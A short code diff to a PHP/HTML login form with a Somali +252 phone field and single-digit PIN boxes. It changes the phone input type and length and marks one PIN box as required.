@@ -26,7 +26,7 @@ if(isset($_GET['error'])){
 
 <div class="phone-box">
     <span>🇸🇴SO +252</span>
-    <input type="text" id="phone" name="phone" placeholder="699999999" maxlength="9" required>
+    <input type="tel" id="phone" name="phone" placeholder="699999999" maxlength="10" required>
 </div>
 
 <div class="pin-container">
@@ -35,7 +35,7 @@ if(isset($_GET['error'])){
         <input type="password" maxlength="1" class="pin">
         <input type="password" maxlength="1" class="pin">
         <input type="password" maxlength="1" class="pin">
-        <input type="password" maxlength="1" class="pin">
+        <input type="password" maxlength="1" class="pin" required>
     </div>
 
     <span id="togglePin" style="cursor:pointer; font-size:20px;">👁</span>
